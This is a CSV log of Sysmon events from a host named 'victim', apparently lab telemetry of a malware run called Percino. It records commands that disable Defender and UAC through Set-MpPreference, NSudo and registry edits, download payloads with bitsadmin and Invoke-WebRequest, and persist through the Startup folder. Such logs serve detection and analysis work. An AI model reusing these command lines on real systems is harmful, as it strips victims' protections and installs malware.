host.name,process.args,file.path,event.action,user.name.text
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_zxaubcvi.xve.ps1,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_pyggkl5j.pzy.ps1,File created (rule: FileCreate),Patricia Goh
victim,"powershell.exe, -command, Set-MpPreference -ModerateThreatDefaultAction 6",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_gtowedc5.jtx.ps1,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_rxalb2w2.awg.ps1,File created (rule: FileCreate),Patricia Goh
victim,"powershell.exe, -command, Set-MpPreference -HighThreatDefaultAction 6 -Force",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"-s, -1, -f, 2, -t, You're, about, to, be, signed, out, -m, Windows, will, shut, down, in, less, than, a, minute., -a, 3",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"shutdown, -r",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,NaN,C:\Users\Patricia Goh\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Percino.exe,File created (rule: FileCreate),Patricia Goh
victim,"bitsadmin, /transfer, Installation, /download, /priority, foreground, https://raw.githubusercontent.com/Percin0/Perci_Bat/main/Percino.exe, C:\Supertools\Percino.exe",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"C:\Program Files\winlogbeat\winlogbeat.exe, --environment=windows_service, -c, C:\Program Files\winlogbeat\winlogbeat.yml, --path.home, C:\Program Files\winlogbeat, --path.data, C:\ProgramData\winlogbeat, --path.logs, C:\ProgramData\winlogbeat\logs, -E, logging.files.redirect_stderr=true",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"-c, -s, 0, -f, 0, -t, Empty, -m, Empty, -a, 0, -u, Empty",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_c0izitp4.nbb.ps1,File created (rule: FileCreate),Patricia Goh
victim,"taskhostw.exe, SyncFromCloud",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"C:\Program Files\winlogbeat\winlogbeat.exe, --environment=windows_service, -c, C:\Program Files\winlogbeat\winlogbeat.yml, --path.home, C:\Program Files\winlogbeat, --path.data, C:\ProgramData\winlogbeat, --path.logs, C:\ProgramData\winlogbeat\logs, -E, logging.files.redirect_stderr=true",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,NaN,NaN,Dns query (rule: DnsQuery),SYSTEM
victim,NaN,NaN,Dns query (rule: DnsQuery),NETWORK SERVICE
victim,"C:\Program Files (x86)\Microsoft\Edge\Application\106.0.1370.52\identity_helper.exe, --type=utility, --utility-sub-type=winrt_app_id.mojom.WinrtAppIdService, --lang=en-US, --service-sandbox-type=none, --mojo-platform-channel-handle=3080, --field-trial-handle=2096,i,12931208589142636227,13865709978780780176,131072, /prefetch:8",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"C:\Program Files (x86)\Microsoft\Edge\Application\106.0.1370.52\identity_helper.exe, --type=utility, --utility-sub-type=winrt_app_id.mojom.WinrtAppIdService, --lang=en-US, --service-sandbox-type=none, --mojo-platform-channel-handle=3080, --field-trial-handle=2096,i,12931208589142636227,13865709978780780176,131072, /prefetch:8",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe, --type=utility, --utility-sub-type=storage.mojom.StorageService, --lang=en-US, --service-sandbox-type=utility, --mojo-platform-channel-handle=2428, --field-trial-handle=2096,i,12931208589142636227,13865709978780780176,131072, /prefetch:8",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe, --type=utility, --utility-sub-type=network.mojom.NetworkService, --lang=en-US, --service-sandbox-type=none, --mojo-platform-channel-handle=2020, --field-trial-handle=2096,i,12931208589142636227,13865709978780780176,131072, /prefetch:3",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe, --type=gpu-process, --gpu-preferences=UAAAAAAAAADgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA=, --mojo-platform-channel-handle=1936, --field-trial-handle=2096,i,12931208589142636227,13865709978780780176,131072, /prefetch:2",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_amefpjma.vwr.ps1,File created (rule: FileCreate),Patricia Goh
victim,"powershell.exe, -command, Set-MpPreference -EnableControlledFolderAccess Disabled",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"ping.exe, www.google.com, -n, 1, -w, 1000",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"cmd, /c, Percino.bat",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe, --type=crashpad-handler, --user-data-dir=C:\Users\Patricia Goh\AppData\Local\Microsoft\Edge\User Data, /prefetch:7, --monitor-self-annotation=ptype=crashpad-handler, --database=C:\Users\Patricia Goh\AppData\Local\Microsoft\Edge\User Data\Crashpad, --annotation=IsOfficialBuild=1, --annotation=channel=, --annotation=chromium-version=106.0.5249.119, --annotation=exe=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe, --annotation=plat=Win64, --annotation=prod=Microsoft Edge, --annotation=ver=106.0.1370.52, --initial-client-data=0x100,0x104,0x108,0xdc,0x1a0,0x7ffceb236e08,0x7ffceb236e18,0x7ffceb236e28",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,NaN,C:\Users\PATRIC~1\AppData\Local\Temp\IXP000.TMP\Percino.bat,File created (rule: FileCreate),Patricia Goh
victim,C:\Users\Patricia Goh\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Percino.exe,NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"C:\Windows\system32\mmc.exe, C:\Windows\system32\services.msc",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe, --no-startup-window, --win-session-start, /prefetch:5",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"C:\Users\Patricia Goh\AppData\Local\Microsoft\OneDrive\OneDrive.exe, /background",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,C:\Windows\System32\VBoxTray.exe,NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,C:\Windows\system32\SecurityHealthService.exe,NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,C:\Windows\System32\SecurityHealthSystray.exe,NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"C:\Windows\System32\smartscreen.exe, -Embedding",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,NaN,NaN,Dns query (rule: DnsQuery),LOCAL SERVICE
victim,NaN,NaN,Dns query (rule: DnsQuery),Patricia Goh
victim,NaN,NaN,Dns query (rule: DnsQuery),Patricia Goh
victim,NaN,NaN,Dns query (rule: DnsQuery),Patricia Goh
victim,"C:\Windows\system32\mmc.exe, C:\Windows\system32\services.msc",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,NaN,NaN,Dns query (rule: DnsQuery),NETWORK SERVICE
victim,NaN,NaN,Dns query (rule: DnsQuery),Patricia Goh
victim,NaN,NaN,Dns query (rule: DnsQuery),Patricia Goh
victim,NaN,NaN,Dns query (rule: DnsQuery),Patricia Goh
victim,NaN,NaN,Dns query (rule: DnsQuery),Patricia Goh
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_dunzoypv.0bl.ps1,File created (rule: FileCreate),Patricia Goh
victim,"C:\Windows\system32\svchost.exe, -k, ClipboardSvcGroup, -p",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,C:\Windows\Explorer.EXE,NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,C:\Windows\system32\userinit.exe,NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"C:\Windows\system32\svchost.exe, -k, wsappx, -p",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,ctfmon.exe,NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe, /c",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"taskhostw.exe, {222A245B-E637-4AE9-A93F-A59CA119A75E}",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,taskhostw.exe,NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"taskhostw.exe, USER",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,sihost.exe,NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_gm0njsnm.jqw.ps1,File created (rule: FileCreate),Patricia Goh
victim,"powershell.exe, -command, Invoke-WebRequest -Uri 'http://10.10.10.10:8000/CleanerPerci.bat' -OutFile 'C:\Supertools\CleanerPerci.bat'",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_zdfqiclz.who.ps1,File created (rule: FileCreate),Patricia Goh
victim,"C:\Windows\system32\svchost.exe, -k, appmodel, -p",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,NaN,NaN,Dns query (rule: DnsQuery),Patricia Goh
victim,NaN,NaN,Dns query (rule: DnsQuery),SYSTEM
victim,NaN,NaN,Dns query (rule: DnsQuery),SYSTEM
victim,NaN,NaN,Dns query (rule: DnsQuery),SYSTEM
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_nnq5m45j.aqm.ps1,File created (rule: FileCreate),Patricia Goh
victim,"powershell.exe, New-ItemProperty, -Path, HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system, -Name, EnableLUA, -PropertyType, DWord, -Value, 0, -Force",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"reg, add, HKLM\SYSTEM\CurrentControlSet\Services\wdboot, /v, Start, /t, REG_DWORD, /d, 4, /f",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"NSudoLC.exe, -U:T, -ShowWindowMode:Hide, reg, add, HKLM\SYSTEM\CurrentControlSet\Services\wdboot, /v, Start, /t, REG_DWORD, /d, 4, /f",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"reg, add, HKLM\SYSTEM\CurrentControlSet\Services\wdfilter, /v, Start, /t, REG_DWORD, /d, 4, /f",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"NSudoLC.exe, -U:T, -ShowWindowMode:Hide, reg, add, HKLM\SYSTEM\CurrentControlSet\Services\wdfilter, /v, Start, /t, REG_DWORD, /d, 4, /f",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"reg, add, HKLM\SYSTEM\CurrentControlSet\Services\WdnisDrv, /v, Start, /t, REG_DWORD, /d, 4, /f",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"NSudoLC.exe, -U:T, -ShowWindowMode:Hide, reg, add, HKLM\SYSTEM\CurrentControlSet\Services\WdnisDrv, /v, Start, /t, REG_DWORD, /d, 4, /f",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"reg, add, HKLM\SYSTEM\CurrentControlSet\Services\Sense, /v, Start, /t, REG_DWORD, /d, 4, /f",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"NSudoLC.exe, -U:T, -ShowWindowMode:Hide, reg, add, HKLM\SYSTEM\CurrentControlSet\Services\Sense, /v, Start, /t, REG_DWORD, /d, 4, /f",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"reg, add, HKLM\SYSTEM\CurrentControlSet\Services\WinDefend, /v, Start, /t, REG_DWORD, /d, 4, /f",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"NSudoLC.exe, -U:T, -ShowWindowMode:Hide, reg, add, HKLM\SYSTEM\CurrentControlSet\Services\WinDefend, /v, Start, /t, REG_DWORD, /d, 4, /f",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"reg, add, HKLM\SYSTEM\CurrentControlSet\Services\WdNisSvc, /v, Start, /t, REG_DWORD, /d, 4, /f",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,C:\Windows\servicing\TrustedInstaller.exe,NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"NSudoLC.exe, -U:T, -ShowWindowMode:Hide, reg, add, HKLM\SYSTEM\CurrentControlSet\Services\WdNisSvc, /v, Start, /t, REG_DWORD, /d, 4, /f",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,NaN,C:\Supertools\Nsudo\x64\NSudoPluginHost.exe,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Nsudo\x64\NSudoLG.exe,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Nsudo\x64\NSudoLC.exe,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Nsudo\x64\NSudoDM.dll,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Nsudo\x64\NSudoAPI.dll,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Nsudo\x64\MoPlugin.dll,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Nsudo\Win32\NSudoPluginHost.exe,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Nsudo\Win32\NSudoLG.exe,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Nsudo\Win32\NSudoLC.exe,File created (rule: FileCreate),Patricia Goh
victim,"C:\Windows\System32\SecurityHealthHost.exe, {08728914-3F57-4D52-9E31-49DAECA5A80A}, -Embedding",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"wmiadap.exe, /F, /T, /R",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,NaN,NaN,Dns query (rule: DnsQuery),LOCAL SERVICE
victim,"taskhostw.exe, SYSTEM",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"C:\Windows\system32\wbem\unsecapp.exe, -Embedding",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,NaN,C:\Windows\System32\wbem\Repository\WRITABLE.TST,File created (rule: FileCreate),SYSTEM
victim,"ssh-keygen, -A",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,C:\Windows\system32\wlms\wlms.exe,NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"C:\Program Files\winlogbeat\winlogbeat.exe, --environment=windows_service, -c, C:\Program Files\winlogbeat\winlogbeat.yml, --path.home, C:\Program Files\winlogbeat, --path.data, C:\ProgramData\winlogbeat, --path.logs, C:\ProgramData\winlogbeat\logs, -E, logging.files.redirect_stderr=true",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,C:\Windows\Sysmon.exe,NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,C:\Program Files\OpenSSH-Win64\sshd.exe,NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"C:\Windows\System32\svchost.exe, -k, utcsvc, -p",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"C:\Windows\system32\svchost.exe, -k, NetworkServiceNetworkRestricted, -p",NaN,Process Create (rule: ProcessCreate),NETWORK SERVICE
victim,"C:\Windows\system32\svchost.exe, -k, LocalServiceNoNetworkFirewall, -p",NaN,Process Create (rule: ProcessCreate),LOCAL SERVICE
victim,C:\Windows\System32\spoolsv.exe,NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"C:\Windows\system32\svchost.exe, -k, LocalServiceNetworkRestricted, -p",NaN,Process Create (rule: ProcessCreate),LOCAL SERVICE
victim,"C:\Windows\System32\svchost.exe, -k, LocalServiceNetworkRestricted, -p",NaN,Process Create (rule: ProcessCreate),LOCAL SERVICE
victim,C:\Windows\system32\dxgiadaptercache.exe,NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"C:\Windows\System32\svchost.exe, -k, LocalServiceNetworkRestricted, -p",NaN,Process Create (rule: ProcessCreate),LOCAL SERVICE
victim,"C:\Windows\system32\svchost.exe, -k, LocalService, -p",NaN,Process Create (rule: ProcessCreate),LOCAL SERVICE
victim,C:\Windows\System32\VBoxService.exe,NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"C:\Windows\System32\Upfc.exe, /launchtype, boot, /cv, fDSeTVXqP0CumgK4AYI5Dw.0",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"taskhostw.exe, ExploitGuardPolicy",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"C:\Windows\system32\svchost.exe, -k, LocalService, -p",NaN,Process Create (rule: ProcessCreate),LOCAL SERVICE
victim,NaN,C:\Windows\Tasks\SA.DAT,File created (rule: FileCreate),SYSTEM
victim,"C:\Windows\System32\svchost.exe, -k, LocalSystemNetworkRestricted, -p",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"C:\Windows\System32\svchost.exe, -k, LocalServiceNetworkRestricted, -p",NaN,Process Create (rule: ProcessCreate),LOCAL SERVICE
victim,"C:\Windows\system32\svchost.exe, -k, LocalServiceNoNetwork, -p",NaN,Process Create (rule: ProcessCreate),LOCAL SERVICE
victim,"C:\Windows\system32\svchost.exe, -k, netsvcs, -p",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,dwm.exe,NaN,Process Create (rule: ProcessCreate),DWM-1
victim,"LogonUI.exe, /flags:0x2, /state0:0xa3be3855, /state1:0x41c64e6d",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"C:\Windows\system32\svchost.exe, -k, RPCSS, -p",NaN,Process Create (rule: ProcessCreate),NETWORK SERVICE
victim,"C:\Windows\system32\svchost.exe, -k, DcomLaunch, -p",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,NaN,NaN,Registry value set (rule: RegistryEvent),SYSTEM
victim,NaN,NaN,Registry value set (rule: RegistryEvent),SYSTEM
victim,NaN,NaN,created-process,NaN
victim,C:\Windows\system32\lsass.exe,NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,C:\Windows\system32\services.exe,NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,winlogon.exe,NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"%%SystemRoot%%\system32\csrss.exe, ObjectDirectory=\Windows, SharedSection=1024,20480,768, Windows=On, SubSystemType=Windows, ServerDll=basesrv,1, ServerDll=winsrv:UserServerDllInitialization,3, ServerDll=sxssrv,4, ProfileControl=Off, MaxRequestThreads=16",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,wininit.exe,NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"\SystemRoot\System32\smss.exe, 000000d8, 00000084",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"%%SystemRoot%%\system32\csrss.exe, ObjectDirectory=\Windows, SharedSection=1024,20480,768, Windows=On, SubSystemType=Windows, ServerDll=basesrv,1, ServerDll=winsrv:UserServerDllInitialization,3, ServerDll=sxssrv,4, ProfileControl=Off, MaxRequestThreads=16",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,"\SystemRoot\System32\smss.exe, 000000a0, 00000084",NaN,Process Create (rule: ProcessCreate),SYSTEM
victim,NaN,NaN,Dns query (rule: DnsQuery),SYSTEM
victim,NaN,NaN,Dns query (rule: DnsQuery),SYSTEM
victim,NaN,C:\Supertools\Nsudo\Win32\NSudoDM.dll,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Nsudo\Win32\NSudoAPI.dll,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Nsudo\Win32\MoPlugin.dll,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Nsudo\ARM64\NSudoPluginHost.exe,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Nsudo\ARM64\NSudoLG.exe,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Nsudo\ARM64\NSudoLC.exe,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Nsudo\ARM64\NSudoDM.dll,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Nsudo\ARM64\NSudoAPI.dll,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Supertools\Nsudo\ARM64\MoPlugin.dll,File created (rule: FileCreate),Patricia Goh
victim,"powershell.exe, -command, Expand-Archive, -Force, 'C:\Supertools\Nsudo.zip', 'C:\Supertools\Nsudo'",C:\Windows\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.Archive\Microsoft.PowerShell.Archive.psm1,Executing Pipeline,Patricia Goh
victim,"powershell.exe, -command, Expand-Archive, -Force, 'C:\Supertools\Nsudo.zip', 'C:\Supertools\Nsudo'",C:\Windows\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.Archive\Microsoft.PowerShell.Archive.psm1,Executing Pipeline,Patricia Goh
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_cbi0dpyc.v1y.ps1,File created (rule: FileCreate),Patricia Goh
victim,NaN,C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_y1t5or4p.acz.ps1,File created (rule: FileCreate),Patricia Goh
victim,"powershell.exe, -command, Expand-Archive -Force 'C:\Supertools\Nsudo.zip' 'C:\Supertools\Nsudo'",NaN,Process Create (rule: ProcessCreate),Patricia Goh
victim,"bitsadmin, /transfer, Download, /download, /priority, FOREGROUND, https://github.com/M2Team/NSudo/releases/download/9.0-Preview1/NSudo_9.0_Preview1_9.0.2676.0.zip, C:\Supertools\Nsudo.zip",NaN,Process Create (rule: ProcessCreate),Patricia Goh
